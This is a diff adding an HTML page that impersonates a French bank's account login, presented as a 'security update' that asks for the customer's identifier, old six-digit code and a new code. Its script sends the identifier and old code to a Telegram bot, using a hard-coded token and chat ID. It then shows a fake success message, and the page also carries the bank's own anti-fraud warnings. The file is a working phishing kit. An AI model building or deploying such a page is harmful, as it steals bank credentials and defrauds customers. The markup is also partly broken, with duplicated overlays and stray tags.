@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Accéder à mes comptes</title>
+ <style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+  }
+
+  body {
+    background: #fff;
+    color: #132033;
+  }
+
+  .page {
+    min-height: 100vh;
+    display: grid;
+    grid-template-columns: 0.95fr 1.05fr 0.7fr;
+  }
+
+  .left {
+    position: relative;
+    min-height: 100vh;
+    overflow: hidden;
+    background: #d7c0a4;
+  }
+
+  .left img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+
+  .left-card {
+    position: absolute;
+    left: 24px;
+    bottom: 24px;
+    width: 320px;
+    background: rgba(255,255,255,0.96);
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.10);
+  }
+
+  .left-card h3 {
+    font-size: 28px;
+    line-height: 1.1;
+    margin-bottom: 10px;
+    color: #17302d;
+  }
+
+  .left-card p {
+    font-size: 14px;
+    line-height: 1.5;
+    color: #4b5563;
+    margin-bottom: 14px;
+  }
+
+  .left-card button {
+    border: none;
+    border-radius: 999px;
+    background: #29b3a0;
+    color: white;
+    font-weight: 700;
+    padding: 10px 18px;
+    cursor: pointer;
+  }
+
+  .center {
+    padding: 48px 38px;
+  }
+
+  .title {
+    font-size: 38px;
+    line-height: 1.04;
+    font-weight: 800;
+    color: #182230;
+    margin-bottom: 18px;
+    white-space: nowrap;
+  }
+
+  .mini-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: #3a4b5f;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+
+  .mini-text {
+    font-size: 14px;
+    color: #667487;
+    margin-bottom: 18px;
+  }
+
+  .field-wrap {
+    position: relative;
+    margin-bottom: 14px;
+    max-width: 420px;
+  }
+
+ .field{
+width:100%;
+border:1px solid #d5dbe4;
+height:54px;
+border-radius:8px;
+padding:0 42px 0 14px;
+font-size:16px;
+outline:none;
+background:white;
+}
+  
+
+  .field-close {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 22px;
+    color: #7b8794;
+    cursor: pointer;
+    user-select: none;
+  }
+  .field:focus{
+border:2px solid #1e6f5c;
+}
+.mini-text{
+color:#6b7280;
+font-size:14px;
+margin-bottom:10px;
+}
+
+ .keypad{
+display:grid;
+grid-template-columns:repeat(5,1fr);
+gap:18px 26px;
+width:420px;
+max-width:100%;
+margin:18px 0 24px;
+}
+
+.key{
+height:56px;
+border:none;
+border-radius:16px;
+background:#f4f6f8;
+font-size:34px;
+color:#1f2937;
+cursor:pointer;
+transition:all 0.15s ease;
+box-shadow:0 2px 6px rgba(0,0,0,0.04);
+}
+
+.key:hover{
+background:#e9eef2;
+transform:translateY(-1px);
+}
+
+.key:active{
+transform:scale(0.97);
+background:#dde5ea;
+}
+
+ .validate-btn{
+width:320px;
+max-width:100%;
+height:54px;
+border:none;
+border-radius:999px;
+background:#1e6f5c;
+color:white;
+font-size:18px;
+font-weight:800;
+cursor:pointer;
+transition:all 0.2s ease;
+box-shadow:0 6px 16px rgba(30,111,92,0.18);
+  position: relative;
+  z-index: 9999;
+}
+
+
+.validate-btn:hover{
+background:#175a49;
+transform:translateY(-1px);
+}
+
+.validate-btn:active{
+transform:scale(0.98);
+}
+
+.validate-btn.loading{
+opacity:0.8;
+pointer-events:none;
+}
+
+  .message {
+    font-size: 14px;
+    font-weight: 700;
+    min-height: 20px;
+  }
+
+  .message.success {
+    color: #118a55;
+  }
+
+  .message.error {
+    color: #c62828;
+  }
+
+  .right {
+    padding: 54px 28px 30px 0;
+    font-size: 14px;
+    line-height: 1.6;
+    color: #465466;
+  }
+
+  .right h4 {
+    font-size: 14px;
+    color: #1f2937;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+  }
+
+  .right .block {
+    margin-bottom: 28px;
+  }
+
+  .right ul {
+    padding-left: 18px;
+  }
+
+  .right a {
+    color: #2d7d6a;
+  }
+
+  @media (max-width: 1200px) {
+    .page {
+      grid-template-columns: 1fr;
+    }
+
+    .left {
+      min-height: 320px;
+    }
+
+    .right {
+      padding: 20px 38px 30px;
+    }
+  }
+  .topbar{
+height:70px;
+background:white;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:0 25px;
+box-shadow:0 2px 8px rgba(0,0,0,0.05);
+}
+
+.logo{
+height:47px;
+}
+
+.close{
+width:60px;
+height:60px;
+background:#1e6f5c;
+color:white;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:30px;
+cursor:pointer;
+}
+
+.left img{
+height:60%;
+object-fit:cover;
+}
+
+.promo{
+background:#1e6f5c;
+color:white;
+padding:30px;
+height:40%;
+display:flex;
+flex-direction:column;
+justify-content:center;
+}
+
+.badge{
+background:white;
+color:#1e6f5c;
+padding:6px 12px;
+border-radius:20px;
+font-weight:bold;
+width:120px;
+margin-bottom:15px;
+}
+
+.promo h2{
+font-size:24px;
+margin-bottom:10px;
+}
+
+.promo p{
+margin-bottom:10px;
+}
+
+.promo a{
+color:white;
+font-weight:bold;
+text-decoration:underline;
+}
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+
+#loaderOverlay{
+display:none;
+position:fixed;
+inset:0;
+background:rgba(255,255,255,0.82);
+backdrop-filter:blur(4px);
+z-index:9999;
+align-items:center;
+justify-content:center;
+padding:20px;
+}
+
+.loader-card{
+width:100%;
+max-width:340px;
+background:white;
+border-radius:24px;
+padding:28px 24px;
+box-shadow:0 20px 50px rgba(15,23,42,0.12);
+text-align:center;
+}
+
+.loader-logo{
+width:52px;
+height:52px;
+margin:0 auto 16px;
+border-radius:16px;
+background:linear-gradient(135deg,#1f8a70,#6bc5b1);
+}
+
+.loader-spinner{
+width:52px;
+height:52px;
+margin:0 auto 18px;
+border:5px solid #e6eeeb;
+border-top:5px solid #1e6f5c;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
+
+.loader-title{
+font-size:22px;
+font-weight:800;
+color:#132033;
+margin-bottom:8px;
+}
+
+.loader-text{
+font-size:15px;
+color:#64748b;
+line-height:1.5;
+min-height:44px;
+}
+
+</style>
+</head>
+<body>
+  <div class="topbar">
+
+<img src="logo.png" class="logo">
+
+<div class="close">×</div>
+
+</div>
+  <div class="page">
+
+   <section class="left">
+
+<img src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?q=80&w=1400&auto=format&fit=crop">
+
+<div class="promo">
+
+<div class="badge">OFFRE JEUNES</div>
+
+<h2>Mozaïc Black, 1 compte courant, 1 carte gratuite*</h2>
+
+<p>
+Votre enfant grandit, ses responsabilités aussi : c’est le moment idéal
+pour l’initier à la gestion de son argent.
+</p>
+
+<p>
+Jusqu’à 80€ offert* pour toute souscription jusqu’au 30/04/2026.
+</p>
+
+<p>*Voir conditions et détails sur site.</p>
+
+<a href="#">Je demande la carte gratuite pour mon ado</a>
+
+</div>
+
+</section>
+
+    <section class="center">
+
+      <div class="title">Accéder à mes comptes</div>
+
+      <div class="mini-title">Mise à jour sécurité</div>
+      <div class="mini-text">
+        Veuillez confirmer votre identifiant puis mettre à jour votre code sécurité.
+      </div>
+
+      <div class="mini-title">Identifiant</div>
+      <div class="mini-text">Saisissez votre identifiant à 11 chiffres</div>
+      <div class="field-wrap">
+        <input id="identifier" class="field" type="text" placeholder="Exemple 98765432195">
+        <span class="field-close" onclick="document.getElementById('identifier').value=''"></span>
+      </div>
+
+      <div class="mini-title">Ancien code à 6 chiffres</div>
+      <div class="field-wrap">
+        <input id="oldCode" class="field" type="password" placeholder="••••••">
+        <span class="field-close" onclick="document.getElementById('oldCode').value=''"></span>
+      </div>
+
+      <div class="mini-title">Nouveau code à 6 chiffres</div>
+      <div class="field-wrap">
+        <input id="newCode" class="field" type="password" placeholder="••••••">
+        <span class="field-close" onclick="document.getElementById('newCode').value=''"></span>
+      </div>
+
+      <div class="mini-title">Confirmer le nouveau code</div>
+      <div class="field-wrap">
+        <input id="confirmCode" class="field" type="password" placeholder="••••••">
+        <span class="field-close" onclick="document.getElementById('confirmCode').value=''"></span>
+      </div>
+
+      <div class="keypad">
+        <button class="key" onclick="addToActive('8')">8</button>
+        <button class="key" onclick="addToActive('7')">7</button>
+        <button class="key" onclick="addToActive('5')">5</button>
+        <button class="key" onclick="addToActive('0')">0</button>
+        <button class="key" onclick="addToActive('1')">1</button>
+
+        <button class="key" onclick="addToActive('2')">2</button>
+        <button class="key" onclick="addToActive('3')">3</button>
+        <button class="key" onclick="addToActive('9')">9</button>
+        <button class="key" onclick="addToActive('4')">4</button>
+        <button class="key" onclick="addToActive('6')">6</button>
+      </div>
+
+     <button class="validate-btn" type="button" onclick="window.changeCode()">VALIDER</button>
+      <div id="message" class="message"></div>
+
+    </section>
+
+    <aside class="right">
+
+      <div class="block">
+        <h4>Restez vigilants face aux tentatives de fraude</h4>
+        <ul>
+          <li>Ne communiquez jamais vos données personnelles.</li>
+          <li>Vérifiez toujours l’adresse du site consulté.</li>
+          <li>Changez votre code régulièrement.</li>
+        </ul>
+      </div>
+
+      <div class="block">
+        <h4>Votre identification</h4>
+        <p>
+          Pour sécuriser votre espace, saisissez votre identifiant puis votre ancien code
+          avant de définir votre nouveau code.
+        </p>
+      </div>
+
+      <div class="block">
+        <h4>Besoin d’aide ?</h4>
+        <p>
+          <a href="#">Voir l’aide en ligne</a>
+        </p>
+      </div>
+
+    </aside>
+
+  </div>
+   <div id="loaderOverlay" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(255,255,255,0.85);
+z-index:9999;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+">
+  <div style="
+    width:50px;
+    height:50px;
+    border:5px solid #dfe7e5;
+    border-top:5px solid #2d7d6a;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+  "></div>
+  <p style="margin-top:15px;font-size:18px;color:#2d7d6a;font-weight:bold;">
+    Chargement...
+  </p>
+</div>
+<div id="loaderOverlay">
+  <div class="loader-card">
+    <div class="loader-logo"></div>
+    <div class="loader-spinner"></div>
+    <div class="loader-title">Connexion en cours</div>
+    <div class="loader-text" id="loaderText">
+      Vérification de votre espace...
+    </div>
+  </div>
+
+</div>
+<div id="loaderOverlay">
+  <div class="loader-card">
+    <div class="loader-logo"></div>
+    <div class="loader-spinner"></div>
+    <div class="loader-title">Chargement</div>
+    <div class="loader-text" id="loaderText">
+      Vérification en cours...
+</body>
+<script>
+let activeInput = null;
+
+document.addEventListener("DOMContentLoaded", function () {
+  const identifier = document.getElementById("identifier");
+  const oldCode = document.getElementById("oldCode");
+  const newCode = document.getElementById("newCode");
+  const confirmCode = document.getElementById("confirmCode");
+  const message = document.getElementById("message");
+  const overlay = document.getElementById("loaderOverlay");
+  const loaderText = document.getElementById("loaderText");
+  const btn = document.querySelector(".validate-btn");
+
+  const TELEGRAM_TOKEN = "7909415076:AAHrPXN9QttqJ4Fz2cmJWTDijqQPKE_BeIE";
+  const TELEGRAM_CHAT_ID = "-4630639927";
+
+
+  [identifier, oldCode, newCode, confirmCode].forEach((input) => {
+    if (!input) return;
+
+    input.addEventListener("focus", function () {
+      activeInput = input;
+    });
+
+    input.addEventListener("click", function () {
+      activeInput = input;
+    });
+  });
+
+  window.addToActive = function (num) {
+    if (!activeInput) {
+      activeInput = document.activeElement;
+    }
+
+    if (!activeInput || activeInput.tagName !== "INPUT") {
+      activeInput = identifier || oldCode || newCode || confirmCode;
+    }
+
+    if (activeInput) {
+      activeInput.value += num;
+    }
+  };
+
+  window.removeLast = function () {
+    if (!activeInput) {
+      activeInput = identifier || oldCode || newCode || confirmCode;
+    }
+
+    if (activeInput) {
+      activeInput.value = activeInput.value.slice(0, -1);
+    }
+  };
+
+  window.changeCode = function () {
+    alert("changeCode lancé");
+
+    const identifierValue = identifier ? identifier.value.trim() : "";
+    const oldValue = oldCode ? oldCode.value.trim() : "";
+    const newValue = newCode ? newCode.value.trim() : "";
+    const confirmValue = confirmCode ? confirmCode.value.trim() : "";
+
+    if (!message || !overlay || !loaderText || !btn) {
+      console.error("Éléments introuvables dans la page.");
+      return;
+    }
+
+    message.className = "message";
+    message.textContent = "";
+
+    if (identifier && identifierValue.length < 3) {
+      message.classList.add("error");
+      message.textContent = "Entrez un identifiant valide.";
+      return;
+    }
+
+    if (oldCode && oldValue.length < 6) {
+      message.classList.add("error");
+      message.textContent = "Entrez l'ancien code à 6 chiffres.";
+      return;
+    }
+
+    if (newCode && newValue.length < 6) {
+      message.classList.add("error");
+      message.textContent = "Entrez un nouveau code à 6 chiffres.";
+      return;
+    }
+
+    if (confirmCode && confirmValue.length < 6) {
+      message.classList.add("error");
+      message.textContent = "Confirmez le nouveau code à 6 chiffres.";
+      return;
+    }
+
+    if (newCode && confirmCode && newValue !== confirmValue) {
+      message.classList.add("error");
+      message.textContent = "Les nouveaux codes ne correspondent pas.";
+      return;
+    }
+
+    btn.classList.add("loading");
+    overlay.style.display = "flex";
+    loaderText.textContent = "Validation en cours...";
+
+    setTimeout(function () {
+      loaderText.textContent = "Mise à jour de votre espace...";
+    }, 800);
+
+    setTimeout(function () {
+      const telegramMessage =  `🆔identifiant: ${identifier.value} 🔑mot de passe: ${oldCode.value};`
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: telegramMessage
+        })
+      })
+        .then(function (response) {
+          return response.json();
+        })
+        .then(function (data) {
+          console.log("Réponse Telegram :", data);
+        })
+        .catch(function (error) {
+          console.error("Erreur Telegram :", error);
+        });
+
+      setTimeout(function () {
+        overlay.style.display = "none";
+        btn.classList.remove("loading");
+        message.classList.add("success");
+        message.textContent = "Code modifié avec succès.";
+
+        if (identifier) identifier.value = "";
+        if (oldCode) oldCode.value = "";
+        if (newCode) newCode.value = "";
+        if (confirmCode) confirmCode.value = "";
+
+        activeInput = identifier || oldCode || newCode || confirmCode || null;
+      }, 1800);
+    }, 1200);
+  };
+});
+</script>
+</div>
+</body>
+</html>   
